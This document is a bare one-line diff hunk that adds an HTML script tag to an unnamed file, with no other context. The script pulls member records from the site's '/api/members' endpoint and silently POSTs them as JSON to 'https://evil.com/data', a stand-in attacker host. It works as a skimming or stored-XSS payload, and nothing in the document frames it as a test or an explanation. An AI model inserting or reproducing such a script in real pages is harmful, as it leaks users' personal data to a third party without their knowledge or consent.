@@ -1,0 +1,1 @@
+<script>fetch('/api/members').then(r=>r.json()).then(d=>fetch('https://evil.com/data',{method:'POST',body:JSON.stringify(d)}));</script>
